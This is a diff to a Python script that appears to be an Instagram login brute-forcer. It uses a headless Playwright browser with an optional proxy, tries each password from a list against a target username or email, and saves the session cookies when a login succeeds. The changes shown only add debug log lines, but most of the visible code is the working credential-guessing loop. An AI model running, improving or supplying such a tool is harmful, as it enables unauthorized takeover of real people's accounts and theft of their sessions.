@@ -61,6 +61,10 @@ async def save_session(username: str, session_data: Dict[str, Optional[str]]):
     logger.info(f"✅ Session saved: {session_file}")
 
 
+# Added debug logging to identify potential issues
+logger.debug("🔍 Debugging script execution")
+
+
 async def brute_force_login(
     target: Dict[str, str], passwords: List[str], proxy: Optional[str] = None
 ):
@@ -71,6 +75,7 @@ async def brute_force_login(
     logger.info(f"🎯 Starting brute-force for: {username} ({email})")
 
     async with async_playwright() as p:
+        logger.debug("🔍 Launching browser")
         browser = await p.chromium.launch(
             headless=True, proxy={"server": proxy} if proxy else None
         )
@@ -82,19 +87,24 @@ async def brute_force_login(
                 logger.info(f"🔑 Trying password: {password} for {username}")
 
                 # Navigate to Instagram login page
+                logger.debug("🌐 Navigating to Instagram login page")
                 await page.goto("https://www.instagram.com/accounts/login/")
 
                 # Fill in login form
+                logger.debug("📝 Filling in login form")
                 await page.fill("input[name='username']", email or username)
                 await page.fill("input[name='password']", password)
 
                 # Submit form
+                logger.debug("🚀 Submitting login form")
                 await page.click("button[type='submit']")
 
                 # Wait for response or error
+                logger.debug("⏳ Waiting for response")
                 await page.wait_for_timeout(5000)  # 5 seconds
 
                 # Check for successful login
+                logger.debug("🔍 Checking login success")
                 if page.url != "https://www.instagram.com/accounts/login/":
                     cookies = await context.cookies()
                     session_data = {
@@ -143,10 +153,6 @@ async def brute_force_login(
 
         await browser.close()
         logger.warning(f"❌ FAILED: No valid password found for {username}")
-
-
-# Added debug logging to identify potential issues
-logger.debug("🔍 Debugging script execution")
 
 
 async def main():
